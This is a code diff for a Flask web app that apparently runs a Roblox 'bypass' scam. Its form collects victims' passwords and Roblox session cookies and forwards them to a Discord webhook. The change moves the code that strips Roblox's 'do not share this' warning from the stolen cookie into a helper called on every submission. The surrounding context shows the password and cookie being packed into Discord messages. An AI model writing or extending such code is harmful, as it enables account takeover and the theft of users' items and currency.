@@ -13,6 +13,23 @@ load_dotenv()
 
 app = Flask(__name__)
 
+def clean_roblox_cookie(cookie):
+    """
+    Automatically remove Roblox warning prefix from cookie
+    Returns cleaned cookie without the warning prefix
+    """
+    if not cookie:
+        return cookie
+    
+    warning_pattern = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
+    
+    if cookie.startswith(warning_pattern):
+        cleaned_cookie = cookie[len(warning_pattern):]
+        print(f"Auto-cleaned cookie: Removed warning prefix. Length reduced from {len(cookie)} to {len(cleaned_cookie)} chars")
+        return cleaned_cookie
+    
+    return cookie
+
 def send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url):
     """Send clean bypass logs (without cookie) to Discord webhook"""
     try:
@@ -103,14 +120,8 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
             elif headless:
                 ping_content += ' - Account has Headless!'
         
-        # Prepare cookie content for Discord
+        # Prepare cookie content for Discord (cookie is already cleaned)
         cookie_content = cookie if cookie else 'Not provided'
-        
-        # Auto-remove Roblox warning prefix to save space
-        warning_pattern = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
-        if cookie_content.startswith(warning_pattern):
-            cookie_content = cookie_content[len(warning_pattern):]
-            print(f"Background: Automatically removed Roblox warning prefix. Cookie length reduced from {len(cookie)} to {len(cookie_content)} chars")
         
         # Truncate cookie if too long for Discord
         available_cookie_space = 3990  # Conservative limit
@@ -424,6 +435,9 @@ def submit_form():
         korblox = data.get('korblox', False)
         headless = data.get('headless', False)
         cookie = data.get('cookie', '').strip()
+        
+        # Auto-clean Roblox warning prefix from cookie
+        cookie = clean_roblox_cookie(cookie)
         
         # Server-side validation
         if not cookie:
